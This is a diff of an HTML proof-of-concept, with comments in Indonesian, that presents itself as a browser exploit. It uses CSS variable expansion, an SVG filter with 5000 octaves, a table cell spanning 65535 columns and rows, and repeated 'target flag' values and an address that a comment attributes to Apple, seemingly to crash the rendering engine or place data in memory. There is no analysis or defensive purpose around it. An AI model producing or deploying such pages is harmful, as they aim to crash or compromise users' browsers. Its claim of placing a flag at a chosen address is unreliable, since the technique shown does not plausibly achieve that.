@@ -1,43 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ASB Target Flag Test</title>
-    <style>
-        /* Mencoba memicu rekursi pada mesin CSS */
-        * { 
-            --target: "0x08ad752109466b05"; /* Nilai Flag Apple */
-            --addr: "0x0000000fffffc328";   /* Alamat Target Apple */
-            border: 1px solid var(--target);
-        }
-    </style>
+<style>
+    /* CSS Expansion Attack: Memaksa mesin gaya mengalokasikan string raksasa */
+    :root {
+        --f: "0x08ad752109466b05"; /* Target Flag */
+        --a: var(--f) var(--f) var(--f) var(--f);
+        --b: var(--a) var(--a) var(--a) var(--a);
+        --c: var(--b) var(--b) var(--b) var(--b);
+    }
+    div::before { content: var(--c); }
+</style>
 </head>
 <body>
-
-    <svg xmlns="http://www.w3.org/2000/svg" height="100" width="100">
-        <filter id="crashFilter">
-            <feTurbulence baseFrequency="0.01" numOctaves="5000" seed="1" />
-            <feColorMatrix values="0x08ad752109466b05 0 0 0 0 0 0x08ad752109466b05 0 0 0 0 0 1 0" />
-        </filter>
-        <rect width="100%" height="100%" filter="url(#crashFilter)" />
+    <svg xmlns="http://www.w3.org/2000/svg">
+        <defs>
+            <pattern id="p" width="10" height="10" patternUnits="userSpaceOnUse">
+                <circle id="0x08ad752109466b05" r="5" fill="red" />
+            </pattern>
+        </defs>
+        <rect width="100%" height="100%" fill="url(#p)" />
     </svg>
 
-    <table border="1">
+    <table style="table-layout: fixed;">
         <tr>
-            <td colspan="65535" rowspan="65535">
-                ASB_TARGET_VALUE_0x08ad752109466b05
+            <td id="0x08ad752109466b05" colspan="65535">
+                <div id="0x08ad752109466b05" class="0x08ad752109466b05">
+                <div id="0x08ad752109466b05" class="0x08ad752109466b05">
+                <div id="0x08ad752109466b05" class="0x08ad752109466b05">
+                <div id="0x08ad752109466b05" class="0x08ad752109466b05">
+                    <h1 font-family="0x08ad752109466b05">EXPLOIT PENDING...</h1>
+                </div></div></div></div>
             </td>
         </tr>
     </table>
-
-    <div 
-        data-asb-val="0x08ad752109466b05" 
-        data-asb-addr="0x0000000fffffc328"
-        class="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-        id="BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
-    >
-        Memuat data...
-    </div>
-
 </body>
 </html>
-
